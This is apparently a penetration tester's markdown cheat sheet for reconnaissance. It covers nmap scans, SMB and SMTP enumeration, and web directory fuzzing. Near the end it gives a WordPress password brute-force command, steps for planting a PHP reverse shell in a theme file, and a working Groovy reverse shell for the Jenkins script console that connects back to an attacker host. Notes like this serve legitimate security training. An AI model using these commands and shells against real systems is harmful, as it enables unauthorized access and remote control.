# Enumeration
* [Host Discovery](#Host-Discovery)
* [Services](#Services)
     * [Most common ports](#Most-common-ports)
     * [Port Scanning Nmap](#port-scanning-Nmap)
     * [Vulnerability scanning](#Vulnerability-scanning)
     * [SMTP](#SMTP)
     * [SMB](#SMB)
     * [RPC](#RPC)
* [Web-applications](#Web-applications)
     * [Vulnerability Scanning](#Vulnerability-scanning)
     * [Directory fuzzing](#Directory-fuzzing)

## Host Discovery
#### Nmap No ping top 50
```
sudo nmap --top-ports 50 <RANGE> --open -Pn -oA nmap_top50_hostdicovery
cat nmap_top50_hostdicovery | grep open | cut -d " " -f 2 | sort u > hosts.txt
```

#### NMap ping sweep
```
sudo nmap -sn <RANGE>
```

#### Netdiscover
```
sudo netdiscover -r <RANGE>
sudo netdisover -i <INTERFACE>
```

## Services
### Most common ports
```
21: ftp
22: ssh
23: telnet
25: smtp
53: domain name system
80: http
110: pop3
111: rpcbind
135: msrpc
139: netbios-ssn
143: imap
443: https
445: microsoft-ds
993: imaps
995: pop3s
1723: pptp
3306: mysql
3389: ms-wbt-server
5900: vnc
8080: http-proxy
```

### Port scanning Nmap
#### Full TCP port scan
```
nmap <TARGET> -sV -sC -O -p- -vv -oA fulltcp_<TARGET> 
```

#### Full UDP port scan
```
nmap <TARGET> -sU -sV -sC -p- -vv -oA fulludp_<TARGET> 
```

#### Nmap scan for vulnerabilities
```
nmap <TARGET> -p- --script vuln -vv -oA vulnscan_<TARGET> 
```

#### Usefull flags
- ```-Pn``` No ping #use if host says down but you know its up)
- ```-sn``` No port scan

#### HTTP Openproxy
If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.

## Autorecon
https://github.com/Tib3rius/AutoRecon
```
autorecon -vv <IP>
```

### Vulnerability scanning
#### Nmap scan for vulnerabilities
```
nmap <TARGET> -p- --script vuln -vv -oA vulnscan_<TARGET> 
```

### SMTP
#### Enumerate emails accounts
```
nc -nv <IP> 25
VRFY root
VRFY idontexist
Check output
```

### SMB 
https://book.hacktricks.xyz/pentesting/pentesting-smb

#### Get version script
https://github.com/unkn-0wn/SmbVersion
```
sudo python3 smbver.py <IP> <PORT>
```

#### Nmap enumerate SMB shares
```
nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
nmap -p 139,445 --script=/usr/share/nmap/scripts/smb* <IP>
```

#### Enum4linux
Gotta try this: https://github.com/cddmp/enum4linux-ng
```
enum4linux <IP>
```

#### List shares and check access with null sessions
```
crackmapexec smb -u '' -p '' --shares
```

#### List shares and check access with username and password
- use ```-d <DOMAIN>``` if the account is a domain account
```
crackmapexec smb -u '<uSERNAME>' -p '<PASSWORD>' -d . 
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### Download smb files recursively
```
get <FILE NAME>-
smbget -R smb://<IP>/<SHARE>
```

#### Nbtscan
```
nbtscan <IP>
```

### RPC
#### Nmap enumerate RPC shares
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

## Web-applications
- Check the file extensions in URL’s to see what the application is running (.net .aspx .php etc)
- Inspect page content
- Check Firefox debugger for outdated javascript libraries
- Look for /robots.txt and /sitemap.xml

#### Find subdomains from html pages
```
curl <WEBPAGE>
grep -o '[^/]*\.<DOMAIN>\.com' index.html | sort -u > subdomains.txt
```

### Screenshot a lot of http pages
Collect screenshot from list of ips
```
for ip in $(cat <IP FILE>); do cutycapt --url=$ip --out=$ip.png;done
```

#### Run the following bash script
```
#!/bin/bash
# Bash script to examine the scan results through HTML.
echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> w
eb.html
echo "</BODY></HTML>" >> web.html
```

#### eyewitness
- https://github.com/FortyNorthSecurity/EyeWitness
```
./EyeWitness -f urls.txt --web
```

### Vulnerability scanning
#### Nikto
```
nikto -host <URL> -output nikto-URL.txt
```

### Directory fuzzing
#### Dirb Quick scan
- ```-R``` to disable recursive scanning
- ```-p``` set up a proxy <IP:PORT>
- ```-X``` Append each word with this extensions.
```
dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
```

#### Dirb Big wordlist
```
dirb <URL> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirb-<URL>.txt
```

#### Gobuster Quick scan
- use the ```-b``` flag to blacklist status codes.
- Use the ```-x``` flag to add file extensions.
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<URL>.txt
```

#### Gobuster Big wordlist
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <URL> gobuster-<URL>.txt
```


### Wordpress
#### Scan Wordpress
```
wpscan -url <URL>
```

#### Bruteforce login
```
wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

#### Upload a reveare shell
1. Login --> Appearance --> Theme editor --> 404.php
2. gedit /usr/share/webshells/php/php-reverse-shell.php
3. Paste in 404.php
4. Start listener and go to an unexisting page in the browser

### Jenkings
#### Execute commands
- After login go to /script

#### Reverse java shell
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### General
#### Find dangerous HTTP methods
https://www.sans.org/reading-room/whitepapers/testing/penetration-testing-web-application-dangerous-http-methods-33945
```
curl -v -X OPTIONS http://website/directory
#HTTP options such as PUT, Delete are bad
```
